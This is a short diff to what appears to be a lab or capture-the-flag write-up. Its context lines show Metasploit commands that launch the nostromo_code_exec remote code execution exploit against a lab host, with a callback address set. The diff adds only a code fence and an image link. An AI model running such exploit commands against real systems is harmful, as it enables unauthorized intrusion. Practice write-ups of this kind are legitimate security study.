@@ -14,3 +14,6 @@ use exploit/multi/http/nostromo_code_exec
 set rhosts 10.129.1.193
 set lhost 10.10.14.52
 exploit
+```  
+![image](https://github.com/user-attachments/assets/a4b19893-685d-42e9-8ffe-0ec6c7e25445)
+
